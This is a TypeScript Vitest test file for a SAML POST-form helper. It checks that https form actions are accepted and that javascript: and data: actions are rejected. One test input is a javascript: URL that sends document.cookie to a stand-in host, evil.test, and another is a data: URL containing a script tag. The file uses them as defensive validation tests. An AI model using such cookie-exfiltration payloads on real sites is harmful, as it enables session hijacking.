import { APIError } from "better-auth/api";
import { describe, expect, it } from "vitest";
import { createSAMLPostForm } from "./helpers";

const invalidSAMLBindingLocationMessage =
	"SAML POST binding location must be an absolute http or https URL";

function expectInvalidSAMLBindingLocation(action: string) {
	try {
		createSAMLPostForm(action, "SAMLResponse", "base64value");
		expect.unreachable();
	} catch (error) {
		expect(error).toBeInstanceOf(APIError);
		expect(error).toMatchObject({
			status: "BAD_REQUEST",
			statusCode: 400,
			message: invalidSAMLBindingLocationMessage,
			body: {
				message: invalidSAMLBindingLocationMessage,
			},
		});
	}
}

describe("createSAMLPostForm", () => {
	it("emits an http(s) form action", async () => {
		const res = createSAMLPostForm(
			"https://idp.example.com/slo",
			"SAMLResponse",
			"base64value",
		);
		const html = await res.text();
		expect(html).toContain('action="https://idp.example.com/slo"');
	});

	it("rejects a javascript: form action", () => {
		expectInvalidSAMLBindingLocation(
			"javascript:fetch('https://evil.test/x?c='+document.cookie)",
		);
	});

	it("rejects a data: form action", () => {
		expectInvalidSAMLBindingLocation("data:text/html,<script>1</script>");
	});
});
